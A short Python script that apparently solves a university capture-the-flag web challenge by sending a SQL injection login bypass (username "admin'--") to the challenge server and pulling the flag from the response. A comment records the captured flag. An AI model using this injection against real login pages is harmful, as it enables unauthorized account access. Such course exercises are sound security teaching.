import re
import requests

url = 'http://offsec-chalbroker.osiris.cyber.nyu.edu:1504'
netid = 'xz4344'
cookies = {"CHALBROKER_USER_ID": netid}

data = {
    'username': "admin'--",
    'password': 'random'
}

print("[*] Performing SQL injection...")
response = requests.post(f'{url}/login', data=data, cookies=cookies)
match = re.search(r"flag\{.*?\}", response.text)
flag = match.group(0)
print(f"[+] Found the flag: {flag}")

# flag{y0u_sh4ll_n0t_p4ss...0h_w4it_y0u_d1d!_0f3a1b8853824de7}
